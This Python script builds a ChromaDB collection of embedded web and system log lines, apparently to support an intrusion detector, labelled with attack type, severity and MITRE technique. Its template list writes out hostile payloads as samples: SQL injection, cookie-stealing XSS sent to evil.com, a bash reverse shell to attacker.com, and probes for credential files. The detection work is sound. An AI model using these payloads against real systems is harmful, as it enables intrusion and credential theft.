"""
build_chroma.py
───────────────
Builds the attack_templates_v2 ChromaDB collection from scratch.
Run once at Docker build time (or whenever you upgrade ChromaDB).
Always produces a schema compatible with the installed ChromaDB version.

Usage:
    python build_chroma.py
    CHROMA_PATH=/custom/path python build_chroma.py
"""

import os
import sys

# Disable telemetry BEFORE importing chromadb
os.environ["ANONYMIZED_TELEMETRY"] = "false"
os.environ["CHROMA_TELEMETRY"]     = "false"

import chromadb
from openai import OpenAI
from dotenv import load_dotenv

load_dotenv()

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
CHROMA_PATH     = os.getenv("CHROMA_PATH", "/app/chroma_db_v2")
COLLECTION_NAME = "attack_templates_v2"
EMBED_MODEL     = "text-embedding-3-small"
BATCH_SIZE      = 50          # OpenAI embeddings per API call


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK TEMPLATES
# Each entry: (template_log, attack_types, severity, mitre, category)
# These mirror the patterns in GOD_OF_DETECTION.py so semantic search
# reinforces the rule-based detector — not replaces it.
# ─────────────────────────────────────────────────────────────────────────────
TEMPLATES = [

    # ── SQL Injection ────────────────────────────────────────────────────────
    ('GET /search?q=1\' UNION SELECT null,table_name,null FROM information_schema.tables-- HTTP/1.1',
     "sql_injection,sql_injection_union", 9, "T1190", "injection"),

    ('GET /login?id=1+UNION+ALL+SELECT+username,password,null+FROM+users-- HTTP/1.1',
     "sql_injection_union", 9, "T1190", "injection"),

    ('GET /item?id=1+AND+SLEEP(5)-- HTTP/1.1',
     "sql_injection_time", 8, "T1190", "injection"),

    ('GET /page?id=1+AND+1=1-- HTTP/1.1',
     "sql_injection_blind", 8, "T1190", "injection"),

    ('GET /product?id=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- HTTP/1.1',
     "sql_injection_error", 8, "T1190", "injection"),

    ('GET /search?q=\'+OR+\'1\'=\'1 HTTP/1.1',
     "sql_injection_blind", 8, "T1190", "injection"),

    ('GET /page?id=1;DROP+TABLE+users-- HTTP/1.1',
     "sql_injection", 9, "T1190", "injection"),

    ('GET /page?id=1+UNION+SELECT+LOAD_FILE(\'/etc/passwd\')-- HTTP/1.1',
     "sql_injection", 9, "T1190", "injection"),

    ('GET /search?q=@@version HTTP/1.1',
     "sql_injection", 8, "T1190", "injection"),

    ('GET /login?user=admin\'--&pass=anything HTTP/1.1',
     "sql_injection_blind", 8, "T1190", "injection"),

    # ── XSS ─────────────────────────────────────────────────────────────────
    ('GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1',
     "xss_reflected", 7, "T1059.007", "injection"),

    ('POST /comment HTTP/1.1 -- body: content=<script>document.location=\'http://evil.com?c=\'+document.cookie</script>',
     "xss_stored", 8, "T1059.007", "injection"),

    ('GET /page?name=<img+src=x+onerror=alert(1)> HTTP/1.1',
     "xss_reflected", 7, "T1059.007", "injection"),

    ('GET /page?q=javascript:alert(1) HTTP/1.1',
     "xss_reflected", 7, "T1059.007", "injection"),

    ('GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1',
     "xss_reflected", 7, "T1059.007", "injection"),

    ('GET /page?id=<svg/onload=alert(1)> HTTP/1.1',
     "xss_reflected", 7, "T1059.007", "injection"),

    ('GET /test?param=<iframe+src="javascript:alert(1)"> HTTP/1.1',
     "xss_reflected", 7, "T1059.007", "injection"),

    # ── Command Injection ────────────────────────────────────────────────────
    ('GET /ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1',
     "command_injection", 10, "T1059", "injection"),

    ('GET /exec?cmd=ls+-la+/etc/ HTTP/1.1',
     "command_injection", 10, "T1059", "injection"),

    ('POST /api/check HTTP/1.1 -- body: host=localhost|whoami',
     "command_injection", 10, "T1059", "injection"),

    ('GET /run?input=$(id) HTTP/1.1',
     "command_injection", 10, "T1059", "injection"),

    ('GET /shell?cmd=/bin/bash+-i+>&+/dev/tcp/attacker.com/4444+0>&1 HTTP/1.1',
     "command_injection", 10, "T1059", "injection"),

    ('GET /test?x=`id` HTTP/1.1',
     "command_injection", 10, "T1059", "injection"),

    ('GET /execute?cmd=powershell+-enc+BASE64ENCODEDPAYLOAD HTTP/1.1',
     "command_injection", 10, "T1059", "injection"),

    # ── Path Traversal / LFI / RFI ──────────────────────────────────────────
    ('GET /download?file=../../../etc/passwd HTTP/1.1',
     "path_traversal,lfi", 9, "T1083", "file_access"),

    ('GET /load?page=../../../../etc/shadow HTTP/1.1',
     "lfi", 9, "T1083", "file_access"),

    ('GET /include?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1',
     "path_traversal", 8, "T1083", "file_access"),

    ('GET /view?template=%252e%252e%252fetc%252fpasswd HTTP/1.1',
     "path_traversal", 8, "T1083", "file_access"),

    ('GET /page?file=/etc/hosts HTTP/1.1',
     "lfi", 9, "T1083", "file_access"),

    ('GET /page?file=c:\\windows\\win.ini HTTP/1.1',
     "lfi", 8, "T1083", "file_access"),

    ('GET /include?url=http://evil.com/shell.php HTTP/1.1',
     "rfi", 10, "T1105", "file_access"),

    ('GET /page?file=php://input HTTP/1.1',
     "rfi", 10, "T1105", "file_access"),

    # ── Reconnaissance / Scanners ────────────────────────────────────────────
    ('GET /test.php HTTP/1.1 -- User-Agent: Nikto/2.1.6',
     "vulnerability_scanner", 7, "T1595", "recon"),

    ('GET /vulnerabilities HTTP/1.1 -- User-Agent: sqlmap/1.7',
     "vulnerability_scanner", 7, "T1595", "recon"),

    ('GET /wp-login.php HTTP/1.1 -- User-Agent: WPScan v3.8',
     "vulnerability_scanner", 7, "T1595", "recon"),

    ('GET /cgi-bin/test.cgi HTTP/1.1 -- User-Agent: Nessus',
     "vulnerability_scanner", 7, "T1595", "recon"),

    ('GET /FUZZ HTTP/1.1 -- User-Agent: ffuf/1.5.0',
     "vulnerability_scanner,directory_enumeration", 7, "T1595", "recon"),

    ('GET /api/v1/users HTTP/1.1 -- User-Agent: gobuster/3.2',
     "vulnerability_scanner,directory_enumeration", 7, "T1595", "recon"),

    # ── Directory Enumeration ────────────────────────────────────────────────
    ('GET /backup.zip HTTP/1.1',
     "backup_file_probe", 7, "T1083", "recon"),

    ('GET /database.sql HTTP/1.1',
     "backup_file_probe", 7, "T1083", "recon"),

    ('GET /db_backup.tar.gz HTTP/1.1',
     "backup_file_probe", 7, "T1083", "recon"),

    ('GET /index.php.bak HTTP/1.1',
     "backup_file_probe,directory_enumeration", 6, "T1083", "recon"),

    ('GET /robots.txt HTTP/1.1',
     "web_fingerprinting", 4, "T1592", "recon"),

    ('GET /sitemap.xml HTTP/1.1',
     "web_fingerprinting", 4, "T1592", "recon"),

    ('GET /phpinfo.php HTTP/1.1',
     "web_fingerprinting", 6, "T1592", "recon"),

    # ── Config File Probing ───────────────────────────────────────────────────
    ('GET /.env HTTP/1.1',
     "config_file_probe", 8, "T1083", "recon"),

    ('GET /.git/config HTTP/1.1',
     "config_file_probe", 8, "T1083", "recon"),

    ('GET /wp-config.php HTTP/1.1',
     "config_file_probe", 8, "T1083", "recon"),

    ('GET /.htaccess HTTP/1.1',
     "config_file_probe", 7, "T1083", "recon"),

    ('GET /web.config HTTP/1.1',
     "config_file_probe", 8, "T1083", "recon"),

    ('GET /config.php HTTP/1.1',
     "config_file_probe", 8, "T1083", "recon"),

    ('GET /.aws/credentials HTTP/1.1',
     "sensitive_file_probe", 8, "T1083", "recon"),

    ('GET /id_rsa HTTP/1.1',
     "sensitive_file_probe", 8, "T1083", "recon"),

    # ── Admin Panel Probing ──────────────────────────────────────────────────
    ('GET /admin/ HTTP/1.1',
     "admin_panel_probe", 5, "T1190", "webapp"),

    ('GET /phpmyadmin/ HTTP/1.1',
     "admin_panel_probe", 6, "T1190", "webapp"),

    ('GET /wp-admin/ HTTP/1.1',
     "admin_panel_probe", 5, "T1190", "webapp"),

    ('GET /administrator/ HTTP/1.1',
     "admin_panel_probe", 5, "T1190", "webapp"),

    ('GET /cpanel HTTP/1.1',
     "admin_panel_probe", 6, "T1190", "webapp"),

    # ── CMS Exploits ─────────────────────────────────────────────────────────
    ('POST /xmlrpc.php HTTP/1.1 -- body: methodName=system.multicall',
     "cms_exploit", 8, "T1190", "webapp"),

    ('GET /wp-content/plugins/vulnerable-plugin/exploit.php HTTP/1.1',
     "cms_exploit", 8, "T1190", "webapp"),

    ('GET /index.php?option=com_users&view=login HTTP/1.1',
     "cms_exploit", 7, "T1190", "webapp"),

    # ── Webshell ─────────────────────────────────────────────────────────────
    ('GET /uploads/shell.php?cmd=id HTTP/1.1',
     "webshell_upload", 10, "T1505.003", "webapp"),

    ('GET /images/c99.php HTTP/1.1',
     "webshell_upload", 10, "T1505.003", "webapp"),

    ('POST /upload.php HTTP/1.1 -- filename: backdoor.php',
     "webshell_upload,file_upload_bypass", 10, "T1505.003", "webapp"),

    # ── Brute Force / Credential ──────────────────────────────────────────────
    ('sshd[1234]: Failed password for root from 192.168.1.1 port 22 ssh2',
     "brute_force_ssh", 7, "T1110", "credential"),

    ('sshd[1234]: Invalid user admin from 192.168.1.1',
     "brute_force_ssh", 7, "T1110", "credential"),

    ('sshd[1234]: authentication failure; logname= uid=0 rhost=192.168.1.1',
     "brute_force_ssh", 7, "T1110", "credential"),

    ('POST /login HTTP/1.1 -- 401 Unauthorized (repeated from same IP)',
     "brute_force_web,LOGIN_PATTERNS", 7, "T1110", "credential"),

    ('GET /wp-login.php HTTP/1.1 -- 200 (POST attempts with different passwords)',
     "brute_force_web,credential_stuffing", 8, "T1110.004", "credential"),

    # ── DoS / DDoS ───────────────────────────────────────────────────────────
    ('GET / HTTP/1.1 -- (10000 requests from same IP in 60 seconds)',
     "ddos", 9, "T1498", "dos"),

    ('SYN flood detected from 192.168.1.1 -- 5000 half-open connections',
     "ddos", 9, "T1498", "dos"),

    # ── Cisco ASA ────────────────────────────────────────────────────────────
    ('%ASA-4-733100: Object drop rate 2000 exceeded. Current burst rate is 3000 per second',
     "asa_port_scan", 7, "T1046", "recon"),

    ('%ASA-3-419001: Dropping TCP packet from outside:192.168.1.1/1234 -- embryonic conn limit exceeded',
     "asa_connection_flood", 9, "T1498", "dos"),

    ('%ASA-6-106023: Deny tcp src outside:192.168.1.1/1234 dst inside:10.0.0.1/80 by access-group "ACL_OUTSIDE"',
     "asa_denied", 6, "T1190", "firewall"),

    ('%ASA-6-113005: AAA user authentication Rejected: reason = Invalid password: server = 10.0.0.1: user = vpnuser',
     "asa_vpn_bruteforce", 8, "T1110", "credential"),

    ('%ASA-4-106100: access-list ACL_OUTSIDE denied tcp outside/192.168.1.1(1234) -> inside/10.0.0.1(443)',
     "asa_fw_bypass", 8, "T1562", "evasion"),

    ('%ASA-3-113015: AAA user authentication Rejected from 192.168.1.1 -- locked out exceeding maximum failed attempts',
     "asa_vpn_bruteforce", 8, "T1110", "credential"),

    # ── Infrastructure ───────────────────────────────────────────────────────
    ('GET /level/15/exec HTTP/1.1',
     "cisco_ios_probe", 8, "T1190", "infrastructure"),

    ('GET /server-status HTTP/1.1',
     "apache_exploit", 7, "T1190", "infrastructure"),

    ('GET /manager/html HTTP/1.1',
     "tomcat_exploit", 8, "T1190", "infrastructure"),

    ('GET /index.ida HTTP/1.1',
     "iis_exploit", 8, "T1190", "infrastructure"),

    # ── Protocol Attacks ─────────────────────────────────────────────────────
    ('TRACE / HTTP/1.1',
     "http_method_tampering", 5, "T1190", "protocol"),

    ('OPTIONS / HTTP/1.1 -- checking allowed methods',
     "http_method_tampering", 5, "T1190", "protocol"),

    ('GET / HTTP/1.1 -- Host: evil.com\r\nX-Forwarded-For: 127.0.0.1\r\nX-Injected: value',
     "header_injection", 6, "T1190", "protocol"),

    # ── Normal / Benign ──────────────────────────────────────────────────────
    ('GET /index.html HTTP/1.1 -- 200 OK',
     "normal", 0, "", "benign"),

    ('GET /api/health HTTP/1.1 -- 200 OK',
     "monitoring", 1, "", "benign"),

    ('GET /static/style.css HTTP/1.1 -- 200 OK',
     "normal", 0, "", "benign"),

    ('POST /api/v1/data HTTP/1.1 -- 201 Created (valid JSON payload)',
     "normal", 0, "", "benign"),
]


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def batch(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def embed_batch(texts, client):
    resp = client.embeddings.create(model=EMBED_MODEL, input=texts)
    return [item.embedding for item in resp.data]


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    api_key = os.getenv("OPENAI_API_KEY")
    if not api_key:
        print("❌ OPENAI_API_KEY not set. Exiting.")
        sys.exit(1)

    openai_client = OpenAI(api_key=api_key)

    print("=" * 60)
    print("🔨  Building ChromaDB attack_templates_v2")
    print(f"    Path       : {CHROMA_PATH}")
    print(f"    Templates  : {len(TEMPLATES)}")
    print(f"    ChromaDB   : {chromadb.__version__}")
    print("=" * 60)

    # ── Connect / reset collection ───────────────────────────────────────────
    chroma = chromadb.PersistentClient(
        path=CHROMA_PATH,
        settings=chromadb.Settings(anonymized_telemetry=False),
    )

    # Delete if exists (clean rebuild)
    try:
        chroma.delete_collection(COLLECTION_NAME)
        print(f"🗑️  Deleted existing collection '{COLLECTION_NAME}'")
    except Exception:
        pass   # didn't exist — that's fine

    collection = chroma.create_collection(
        name=COLLECTION_NAME,
        metadata={"hnsw:space": "cosine"},
    )
    print(f"✅  Created fresh collection '{COLLECTION_NAME}'")

    # ── Prepare data ─────────────────────────────────────────────────────────
    texts     = [t[0] for t in TEMPLATES]
    metadatas = [
        {
            "attacks":       t[1],
            "severity":      t[2],
            "mitre_tactics": t[3],
            "category":      t[4],
        }
        for t in TEMPLATES
    ]
    ids = [f"tpl_{i:04d}" for i in range(len(TEMPLATES))]

    # ── Embed in batches ─────────────────────────────────────────────────────
    all_embeddings = []
    total_batches  = (len(texts) + BATCH_SIZE - 1) // BATCH_SIZE

    for i, chunk in enumerate(batch(texts, BATCH_SIZE), 1):
        print(f"   Embedding batch {i}/{total_batches} ({len(chunk)} templates)…")
        embeddings = embed_batch(chunk, openai_client)
        all_embeddings.extend(embeddings)

    # ── Insert into ChromaDB ─────────────────────────────────────────────────
    collection.add(
        ids=ids,
        embeddings=all_embeddings,
        documents=texts,
        metadatas=metadatas,
    )

    print(f"\n🎉  Done! {collection.count()} templates stored in '{COLLECTION_NAME}'")
    print(f"    Location: {CHROMA_PATH}")
    print("=" * 60)


if __name__ == "__main__":
    main()
